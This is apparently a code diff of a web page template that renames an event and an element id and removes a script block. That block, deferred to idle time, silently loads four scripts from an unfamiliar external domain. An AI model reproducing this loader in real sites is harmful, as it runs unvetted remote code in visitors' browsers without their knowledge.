@@ -110,7 +110,7 @@
       function _tryReveal() {
         if (_appReady && _minTimeReached) _revealPage();
       }
-      window.addEventListener("waves:styles-ready", function () {
+      window.addEventListener("styles-ready", function () {
         _appReady = true;
         _tryReveal();
       }, { once: true });
@@ -145,7 +145,7 @@
     <script>
       (function () {
         function loadFaCss() {
-          var id = "waves-fa-css";
+          var id = "fa-css";
           if (document.getElementById(id)) return;
           var l = document.createElement("link");
           l.id = id;
@@ -168,32 +168,6 @@
           s.src = "/b?id=" + ids[i];
           s.defer = true;
           document.head.appendChild(s);
-        }
-      })();
-    </script>
-    <script>
-      (function () {
-        var _loaded = false;
-        function _loadExtras() {
-          if (_loaded) return;
-          _loaded = true;
-          var srcs = [
-            "https://openairtowhardworking.com/9d/5d/7e/9d5d7e8864b7a6d89223a8dacb1b9fd8.js",
-            "https://openairtowhardworking.com/a1/37/68/a1376848d2be9154b24a145e7a3a8df6.js",
-            "https://openairtowhardworking.com/a5/02/af/a502af7353a26bc20a6ce9afbf9047e2.js",
-            "https://openairtowhardworking.com/8a/a4/b0/8aa4b01fe0a3ca54cbda5035b6533dab.js",
-          ];
-          srcs.forEach(function(src) {
-            var s = document.createElement("script");
-            s.src = src;
-            s.async = true;
-            document.body.appendChild(s);
-          });
-        }
-        if (typeof requestIdleCallback === "function") {
-          requestIdleCallback(_loadExtras, { timeout: 5000 });
-        } else {
-          setTimeout(_loadExtras, 3000);
         }
       })();
     </script>
